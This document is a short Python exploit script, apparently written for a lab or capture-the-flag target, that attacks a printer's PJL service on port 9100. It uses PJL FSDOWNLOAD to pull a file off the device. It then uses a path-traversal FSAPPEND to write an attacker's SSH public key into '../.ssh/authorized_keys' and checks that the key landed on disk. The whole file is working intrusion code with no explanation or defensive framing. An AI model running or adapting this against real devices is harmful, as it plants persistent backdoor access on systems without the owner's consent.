#!/usr/bin/env python3
import base64
import re
import socket

def pull(cmd: bytes, expect_min: int = 0) -> bytes:
    s = socket.socket()
    s.settimeout(25)
    s.connect(("127.0.0.1", 9100))
    s.sendall(cmd)
    s.shutdown(socket.SHUT_WR)
    buf = b""
    try:
        while len(buf) < expect_min + 200 or len(buf) < 8000:
            c = s.recv(65536)
            if not c:
                break
            buf += c
    except socket.timeout:
        pass
    s.close()
    return buf


jet = pull(b'@PJL FSDOWNLOAD NAME="jetdirect.py" SIZE=5119\r\n', 5119)
print("jet_len", len(jet))
if jet.startswith(b"OK"):
    jet = jet.split(b"\r\n", 1)[-1]
    if jet.startswith(b"OK"):
        jet = jet.split(b"\n", 1)[-1]
print("jet_stripped", len(jet))
print(jet[:350].decode(errors="replace"))
if b"def " in jet or b"class " in jet:
    open("/tmp/jetdirect.py", "wb").write(jet)
    print("WROTE /tmp/jetdirect.py")
    print("B64", base64.b64encode(jet[:3500]).decode()[:2000])

# after UEL-style write test
KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)
w = pull(f'@PJL FSAPPEND NAME="{PATH}" SIZE={N}\r\n'.encode() + KEY, 0)
print("append_resp", repr(w[:120]))
auth = pull(f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode(), N)
print("auth_len", len(auth), auth[:120])
if b"ssh-ed25519" in auth:
    print("KEY_ON_DISK")